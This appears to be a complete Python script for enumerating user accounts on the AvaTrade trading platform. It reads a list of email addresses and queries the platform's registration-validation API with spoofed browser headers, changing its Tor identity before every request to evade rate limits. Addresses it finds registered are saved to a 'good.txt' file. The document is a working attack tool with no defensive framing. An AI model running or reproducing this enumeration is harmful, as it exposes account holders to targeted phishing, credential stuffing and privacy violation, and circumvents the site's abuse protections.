from stem import Signal
from stem.control import Controller
import requests


def new_identity():
  with Controller.from_port(port = 9051) as controller:
      controller.authenticate('password')
      controller.signal(Signal.NEWNYM)

def requester():
    with open("emails.txt", "r") as f:
        lines = f.readlines()
        for line in lines:
            line = line.strip("\n")
            print(line)

            proxies = {'http':'socks5://localhost:9050', 'https':'socks5://localhost:9050'}

            data = {"InputServiceType":3,"Email":line,"WhiteLabelName":"AvaTrade"}
            headers = {
                "accept": "application/json, text/plain, */*",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
                "appsource": "webtrader",
                "content-length": "75",
                "content-type": "application/json",
                "origin": "https://www.avatrade.com",
                "referer": "https://www.avatrade.com/",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "cross-site",
                "sec-gpc": "1",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
            }
            new_identity()
            req = requests.post("https://services.avaapiweb.com/api/RegistrationValidation/InputValidator", json=data, headers=headers, proxies=proxies)
            if '"Status":2,' in req.text:
                with open("good.txt", "a") as a:
                    a.writelines(line+"\n")
                    a.close()
            print(req.text)


requester()

